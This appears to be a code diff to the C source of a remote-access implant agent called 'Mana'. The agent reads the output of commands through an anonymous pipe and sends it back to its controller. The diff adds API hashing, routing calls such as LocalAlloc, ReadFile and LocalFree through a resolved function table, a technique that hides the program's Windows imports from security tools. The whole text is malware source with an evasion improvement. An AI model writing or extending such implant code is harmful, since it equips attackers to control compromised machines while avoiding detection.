@@ -4,6 +4,7 @@
 #include <Config.h>
 #include <Package.h>
 #include <Command.h>
+#include <Apihashing.h>
 
 VOID ManaInit()
 {
@@ -29,6 +30,8 @@ VOID ManaInit()
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
+    initializeAPI();
+
     printf( "AgentID     => %x\n", Instance.Session.AgentID );
     printf( "Magic Value => %x\n", MANA_MAGIC_VALUE );
 }
@@ -42,16 +45,16 @@ VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
     DWORD    dwRead          = 0;
     BOOL     SuccessFul      = FALSE;
 
-    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );
+    pOutputBuffer = Api.LocalAlloc( LPTR, sizeof(LPVOID) );
 
     do
     {
-        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
+        SuccessFul = Api.ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
 
         if ( dwRead == 0)
             break;
 
-        pOutputBuffer = LocalReAlloc(
+        pOutputBuffer = Api.LocalReAlloc(
             pOutputBuffer,
             dwBufferSize + dwRead,
             LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -70,7 +73,7 @@ VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
     PackageTransmit( Package, NULL, NULL );
 
     memset( pOutputBuffer, 0, dwBufferSize );
-    LocalFree( pOutputBuffer );
+    Api.LocalFree( pOutputBuffer );
     pOutputBuffer = NULL;
 }
 
